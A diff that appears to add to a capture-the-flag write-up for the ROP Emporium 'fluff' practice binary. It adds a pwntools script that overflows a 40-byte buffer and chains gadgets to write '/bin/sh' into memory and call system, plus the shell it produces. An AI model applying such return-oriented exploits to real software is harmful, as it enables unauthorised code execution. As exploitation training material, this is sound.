@@ -821,14 +821,93 @@ Non-debugging symbols:
 ```
 ### Exploit (launch /bin/sh)
 ```
+# Import the library
+from pwn import *
 
+# Debugging
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("fluff")
+
+# Gadgets
+#
+# Pop address into r12: 0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
+popR12Gadget = p64(0x0000000000400832)
+# Zero out r11: 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
+xorR11Gadget = p64(0x0000000000400822)
+# Xor Gadget: 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
+xorR11R12Gadget = p64(0x000000000040082f)
+# XChg Gadget: 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
+xchg_gadget = p64(0x0000000000400840)
+# Gadget: mov 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
+movGadget = p64(0x000000000040084e)
+
+# WriteWhatWhere
+writeWhatWhere = p64(0x601500)
+# String to execute with the system function
+stringToWrite = "/bin/sh\x00"
+
+# poprdi: 0x00000000004008c3: pop rdi; ret;
+poprdi = p64(0x00000000004008c3)
+# Address of system
+system = p64(0x0000000000400810)
+
+# Generate our payload
+#
+# Overflow the fgets buffer
+payload = "a" * 40
+# Put the address of where we want our payload to be
+payload += popR12Gadget
+payload += writeWhatWhere
+payload += xorR11Gadget
+payload += p64(0x41)
+payload += xorR11R12Gadget
+payload += p64(0x41)
+payload += xchg_gadget
+payload += p64(0x41)
+
+# Put our string into R11
+payload += popR12Gadget
+payload += stringToWrite
+payload += xorR11Gadget
+payload += p64(0x41)
+payload += xorR11R12Gadget
+payload += p64(0x41)
+
+# Move payload string from r11 to the address in R10
+payload += movGadget
+payload += p64(0x00)
+payload += p64(0x00)
+
+# Call system with our address in rdi
+payload += poprdi
+payload += writeWhatWhere
+payload += system
+
+# GTG!
+io = elf.process()
+# gdb.attach(io)
+io.sendline(payload)
+io.interactive()
 ```
 ### Result (launch /bin/sh)
 ```
+[root:~/Downloads/RopEmporium]# python fluff-pwntools-exploit.py
+[*] '/root/Downloads/RopEmporium/fluff'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/root/Downloads/RopEmporium/fluff': pid 34612
+[*] Switching to interactive mode
+fluff by ROP Emporium
+64bits
 
+You know changing these strings means I have to rewrite my solutions...
+> $  
 ```
-
-
-
-
-
